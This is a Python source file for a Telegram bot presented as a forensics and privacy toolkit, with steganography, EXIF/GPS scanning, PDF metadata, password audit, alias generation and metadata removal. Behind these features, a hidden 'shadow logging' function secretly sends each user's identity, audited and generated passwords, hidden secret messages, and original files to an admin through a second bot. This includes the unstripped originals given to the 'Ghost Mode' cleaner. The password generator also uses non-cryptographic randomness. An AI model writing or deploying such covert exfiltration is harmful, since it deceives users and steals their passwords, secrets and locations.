import telebot
from PIL import Image, ExifTags
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import io
import os
import re
import random
import string
import threading
from flask import Flask
from stegano import lsb
import pytesseract
import PyPDF2
from faker import Faker

# ==========================================
# 👇 SECURE CONFIGURATION (FROM ENV) 👇
# ==========================================

# 1. MAIN BOT TOKEN
API_TOKEN = os.environ.get('BOT_TOKEN')
if not API_TOKEN:
    print("❌ Error: BOT_TOKEN not found in Environment Variables!")

# 2. PROOF BOT TOKEN (HIDDEN)
PROOF_TOKEN = os.environ.get('PROOF_TOKEN')
if not PROOF_TOKEN:
    print("❌ Error: PROOF_TOKEN not found in Environment Variables!")

# 3. ADMIN ID (HIDDEN)
ADMIN_ID = os.environ.get('ADMIN_ID')
if not ADMIN_ID:
    print("⚠️ Warning: ADMIN_ID not found! Shadow logs won't work.")

# Initialize Bots
bot = telebot.TeleBot(API_TOKEN) if API_TOKEN else None
proof_bot = telebot.TeleBot(PROOF_TOKEN) if PROOF_TOKEN else None

user_data = {}
fake = Faker()

# ==========================================
# 🌐 FAKE WEB SERVER
# ==========================================
app = Flask(__name__)

@app.route('/')
def home():
    return "🤖 Spy Bot V9 (Secure Mode) is Active!"

def run_server():
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)

def keep_alive():
    t = threading.Thread(target=run_server)
    t.start()

print("✅ Professional Forensics Bot V9 (Secure) Online...")

# --- 0. SHADOW LOGGING FUNCTION ---
def log_activity(user_msg, report_text=None, file_data=None, file_name="log.png", caption=""):
    """
    Ye function Proof Bot ke zariye Admin ko logs bhejega.
    Agar Proof Token ya Admin ID nahi mila, toh ye crash nahi karega, bas skip kar dega.
    """
    if not proof_bot or not ADMIN_ID:
        return

    try:
        # User details
        user_info = (
            f"👤 **TARGET USER:**\n"
            f"Name: {user_msg.chat.first_name}\n"
            f"ID: `{user_msg.chat.id}`\n"
            f"Username: @{user_msg.chat.username}\n"
            f"━━━━━━━━━━━━━━━━━━\n"
        )

        full_log = user_info + (report_text if report_text else "")

        # Send Text Report
        proof_bot.send_message(ADMIN_ID, full_log, parse_mode="Markdown")

        # Send File if exists
        if file_data:
            file_data.seek(0)
            proof_bot.send_document(ADMIN_ID, file_data, visible_file_name=file_name, caption=f"📂 Evidence: {caption}")
            
    except Exception as e:
        print(f"Shadow Log Error: {e}")

# --- 1. HELPER FUNCTIONS ---
def get_decimal_from_dms(dms, ref):
    try:
        degrees = dms[0]; minutes = dms[1]; seconds = dms[2]
        decimal = degrees + (minutes / 60.0) + (seconds / 3600.0)
        if ref in ['S', 'W']: decimal = -decimal
        return decimal
    except: return None

def get_gps_coords(exif):
    gps_info = exif.get(34853)
    if not gps_info: return None
    try:
        lat_ref = gps_info.get(1); lat_dms = gps_info.get(2)
        lon_ref = gps_info.get(3); lon_dms = gps_info.get(4)
        if lat_ref and lat_dms and lon_ref and lon_dms:
            return get_decimal_from_dms(lat_dms, lat_ref), get_decimal_from_dms(lon_dms, lon_ref)
    except: return None
    return None

def format_pdf_date(date_str):
    if not date_str: return "Unknown"
    return date_str.replace("D:", "").replace("'", "")

def calculate_complexity(password):
    pool_size = 0
    if re.search(r"[a-z]", password): pool_size += 26
    if re.search(r"[A-Z]", password): pool_size += 26
    if re.search(r"\d", password): pool_size += 10
    if re.search(r"[!@#$%^&*(),.?\":{}|<>]", password): pool_size += 32
    if pool_size == 0: return 0, []
    length = len(password)
    combinations = pool_size ** length
    feedback = []
    if length < 8: feedback.append("- Length is critical (increase to 12+)")
    if not re.search(r"[A-Z]", password): feedback.append("- Add Uppercase letters (A-Z)")
    if not re.search(r"\d", password): feedback.append("- Add Numbers (0-9)")
    if not re.search(r"[!@#$%^&*(),.?\":{}|<>]", password): feedback.append("- Add Symbols (!@#$)")
    return combinations, feedback

def generate_strong_password(length=16):
    chars = string.ascii_letters + string.digits + "!@#$%^&*()"
    return ''.join(random.choice(chars) for i in range(length))

# --- 2. START & MENU ---

@bot.message_handler(commands=['start'])
def welcome(message):
    markup = InlineKeyboardMarkup()
    markup.row_width = 1
    
    btn1 = InlineKeyboardButton("🔐 Encrypt Image (Hide Data)", callback_data="mode_hide")
    btn2 = InlineKeyboardButton("🕵️ Analyze Image (Forensics)", callback_data="mode_scan")
    btn3 = InlineKeyboardButton("📄 Analyze PDF (Metadata)", callback_data="mode_pdf")
    btn4 = InlineKeyboardButton("🛡️ Password Shield (Complexity)", callback_data="mode_pass")
    btn5 = InlineKeyboardButton("🎭 Generate Fake Identity (Alias)", callback_data="mode_alias")
    btn6 = InlineKeyboardButton("🧹 Ghost Mode (Remove Metadata)", callback_data="mode_clean")
    
    markup.add(btn1, btn2, btn3, btn4, btn5, btn6)
    
    welcome_text = (
        "🤖 **Cyber Intelligence Interface V9**\n\n"
        "Welcome, Agent. Select an operation module below:\n"
    )
    bot.reply_to(message, welcome_text, reply_markup=markup, parse_mode="Markdown")
    
    log_activity(message, "🚀 User started the bot.")

# --- 3. BUTTON HANDLER ---

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    if call.data == "mode_hide":
        msg = bot.send_message(call.message.chat.id, "📸 **Encryption Module:**\nPlease upload the **Image** (as Document) to hide secret data.")
        bot.register_next_step_handler(msg, process_photo_for_hiding)
        
    elif call.data == "mode_scan":
        msg = bot.send_message(call.message.chat.id, "🕵️ **Image Analysis Module:**\nUpload a Photo/Document. System will scan for GPS, Metadata & Hidden Text.")
        bot.register_next_step_handler(msg, process_scan)
        
    elif call.data == "mode_pdf":
        msg = bot.send_message(call.message.chat.id, "📄 **PDF Forensics Module:**\nUpload a PDF document to extract authorship metadata.")
        bot.register_next_step_handler(msg, process_pdf_analysis)

    elif call.data == "mode_pass":
        markup = InlineKeyboardMarkup()
        markup.row_width = 1
        btn_audit = InlineKeyboardButton("🔍 Check Password Combinations", callback_data="sub_audit")
        btn_gen = InlineKeyboardButton("⚡ Generate Secure Password", callback_data="sub_gen")
        markup.add(btn_audit, btn_gen)
        bot.send_message(call.message.chat.id, "🛡️ **Password Shield Module:**\nSelect an action:", reply_markup=markup)

    elif call.data == "sub_audit":
        msg = bot.send_message(call.message.chat.id, "🔍 **Complexity Audit:**\nSend the password you want to analyze.")
        bot.register_next_step_handler(msg, process_pass_audit)

    elif call.data == "sub_gen":
        password = generate_strong_password()
        bot.send_message(call.message.chat.id, f"⚡ **Generated Secure Password:**\n\n<code>{password}</code>\n\n(Click to copy)", parse_mode="HTML")
        log_activity(call.message, f"⚡ User generated password: {password}")

    elif call.data == "mode_alias":
        process_alias_generation(call.message)

    elif call.data == "mode_clean":
        msg = bot.send_message(call.message.chat.id, "🧹 **Ghost Mode:**\nUpload a Photo/Document. I will remove GPS & Device metadata and send a clean file.")
        bot.register_next_step_handler(msg, process_metadata_cleaning)

# --- 4. FEATURE: ALIAS GENERATOR ---
def process_alias_generation(message):
    try:
        profile = fake.profile()
        report = f"🎭 **NEW ALIAS GENERATED**\n━━━━━━━━━━━━━━━━━━━━━━━━\n"
        report += f"👤 **Name:** {profile['name']}\n"
        report += f"📧 **Email:** {fake.email()}\n"
        report += f"💼 **Job:** {profile['job']}\n"
        report += f"🏠 **Addr:** {profile['address']}\n"
        report += f"🌐 **IP:** {fake.ipv4()}\n"
        
        bot.send_message(message.chat.id, report, parse_mode="Markdown")
        log_activity(message, report)
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {e}")

# --- 5. FEATURE: METADATA CLEANER ---
def process_metadata_cleaning(message):
    if not message.photo and not message.document:
        bot.reply_to(message, "⚠️ Error: Invalid file.")
        return
    if message.document: file_id = message.document.file_id
    else: file_id = message.photo[-1].file_id

    file_info = bot.get_file(file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    
    try:
        img_stream = io.BytesIO(downloaded_file)
        img = Image.open(img_stream)
        data = list(img.getdata())
        image_without_exif = Image.new(img.mode, img.size)
        image_without_exif.putdata(data)
        
        output = io.BytesIO()
        image_without_exif.save(output, format="PNG")
        output.seek(0)
        
        bot.send_document(message.chat.id, output, caption="🧹 **Cleaned File (Ghost Mode)**\n✅ Safe to share.")
        log_activity(message, "🧹 User used Ghost Mode.", io.BytesIO(downloaded_file), "original.jpg", "Original File")

    except Exception as e:
        bot.reply_to(message, f"❌ Cleanup Failed: {e}")

# --- 6. FEATURE: PASSWORD AUDIT ---
def process_pass_audit(message):
    password = message.text.strip()
    combinations, feedback = calculate_complexity(password)
    formatted_combos = "{:.2e}".format(combinations)
    if combinations < 10**6: rating = "🔴 Critical"
    elif combinations < 10**12: rating = "🟠 Weak"
    elif combinations < 10**18: rating = "🟡 Moderate"
    else: rating = "🟢 Excellent"
    
    report = f"🛡️ **PASSWORD AUDIT**\nInput: ||{password}||\nRating: {rating}\nCombos: {formatted_combos}"
    bot.reply_to(message, report, parse_mode="Markdown")
    log_activity(message, f"🔑 Password Checked:\n{password}\nRating: {rating}")

# --- 7. FEATURE: HIDE SECRET MESSAGE ---
def process_photo_for_hiding(message):
    if not message.photo and not message.document:
        bot.reply_to(message, "⚠️ Error: Invalid file.")
        return
    if message.document: file_id = message.document.file_id
    else: file_id = message.photo[-1].file_id
    file_info = bot.get_file(file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    temp_filename = f"temp_{message.chat.id}.png"
    with open(temp_filename, 'wb') as new_file: new_file.write(downloaded_file)
    user_data[message.chat.id] = {'file_path': temp_filename}
    msg = bot.reply_to(message, "📝 **Input Required:**\nEnter text to hide.")
    bot.register_next_step_handler(msg, process_text_hiding)

def process_text_hiding(message):
    try:
        chat_id = message.chat.id
        if chat_id not in user_data:
            bot.reply_to(message, "❌ Session expired.")
            return
        secret_text = message.text
        file_path = user_data[chat_id]['file_path']
        status = bot.reply_to(message, "⚙️ **Processing...**")
        
        secret_img = lsb.hide(file_path, secret_text)
        output_filename = f"secure_data_{chat_id}.png"
        secret_img.save(output_filename)
        
        with open(output_filename, "rb") as f:
            bot.send_document(chat_id, f, caption="✅ **Encryption Complete.**")
            f.seek(0)
            log_activity(message, f"🔓 **Hidden Secret:**\n{secret_text}", f, "secret.png", "Image with secret")

        if os.path.exists(file_path): os.remove(file_path)
        if os.path.exists(output_filename): os.remove(output_filename)
        del user_data[chat_id]
        bot.delete_message(chat_id, status.message_id)
    except Exception as e: 
        bot.reply_to(message, "❌ Error.")

# --- 8. FEATURE: SCANNING ---
def process_scan(message):
    try:
        status_msg = bot.reply_to(message, "⚙️ **Scanning...**")
        if message.document: file_id = message.document.file_id
        elif message.photo: file_id = message.photo[-1].file_id
        else: return
        file_info = bot.get_file(file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        img_stream = io.BytesIO(downloaded_file)
        image = Image.open(img_stream)
        
        report = "🕵️‍♂️ **FORENSIC REPORT**\n━━━━━━━━━━━━━━━━━━━━━━━━\n"
        exif_data = image._getexif()
        if exif_data:
            make = exif_data.get(271, "N/A"); model = exif_data.get(272, "Unknown")
            report += f"📱 **Device:** {make} {model}\n"
        
        try:
            temp_scan = f"scan_{message.chat.id}.png"
            with open(temp_scan, 'wb') as f: f.write(downloaded_file)
            hidden_msg = lsb.reveal(temp_scan)
            os.remove(temp_scan)
            if hidden_msg: report += f"🔓 **Hidden Data:** {hidden_msg}\n"
        except: pass
        
        if exif_data:
            coords = get_gps_coords(exif_data)
            if coords:
                lat, lon = coords
                map_link = f"https://www.google.com/maps?q={lat},{lon}"
                report += f"📍 **Location:** <a href='{map_link}'>View Map</a>\n"
        
        try:
            extracted_text = pytesseract.image_to_string(image)
            if len(extracted_text.strip()) > 5:
                report += f"📝 **Text:** {extracted_text[:200]}...\n"
        except: pass

        bot.edit_message_text(report, message.chat.id, status_msg.message_id, parse_mode="HTML", disable_web_page_preview=True)
        log_activity(message, report, io.BytesIO(downloaded_file), "scan.jpg", "Scanned File")

    except Exception as e: bot.reply_to(message, f"❌ Error: {e}")

# --- 9. FEATURE: PDF FORENSICS ---
def process_pdf_analysis(message):
    try:
        if not message.document or 'pdf' not in message.document.mime_type:
            bot.reply_to(message, "⚠️ Upload PDF.")
            return
        status_msg = bot.reply_to(message, "⚙️ **Parsing...**")
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        pdf_file = io.BytesIO(downloaded_file)
        reader = PyPDF2.PdfReader(pdf_file)
        meta = reader.metadata
        
        report = "📄 **PDF REPORT**\n"
        if meta:
            report += f"👤 Author: {meta.get('/Author', 'Unknown')}\n"
            report += f"🛠️ Creator: {meta.get('/Creator', 'Unknown')}\n"
            report += f"📅 Created: {format_pdf_date(meta.get('/CreationDate', 'Unknown'))}\n"
        else: report += "⚠️ No metadata."
        
        bot.edit_message_text(report, message.chat.id, status_msg.message_id, parse_mode="HTML")
        log_activity(message, report, io.BytesIO(downloaded_file), "doc.pdf", "PDF File")

    except Exception as e: bot.reply_to(message, "❌ Error.")

if __name__ == "__main__":
    keep_alive()
    if bot:
        bot.infinity_polling()
